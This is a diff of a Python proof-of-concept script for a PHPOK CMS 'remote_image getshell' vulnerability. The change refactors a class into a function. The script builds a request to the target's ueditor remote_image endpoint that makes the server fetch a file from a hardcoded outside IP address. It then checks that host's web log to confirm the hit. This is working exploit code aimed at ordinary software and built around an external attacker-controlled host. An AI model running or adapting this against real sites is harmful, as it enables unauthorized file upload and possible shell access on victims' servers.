@@ -12,14 +12,7 @@ import hashlib
 import datetime
 import requests
 import warnings
-
-
-
-class remote_image_getshell:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['phpok remote_image getshell漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -28,7 +21,7 @@ class remote_image_getshell:
         m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
         md5_str = m.hexdigest()
         payload = "/index.php?c=ueditor&f=remote_image&upfile=http://45.76.158.91:6868/" + md5_str
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             eye_url = "http://45.76.158.91/web.log"
@@ -46,5 +39,5 @@ class remote_image_getshell:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = remote_image_getshell(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
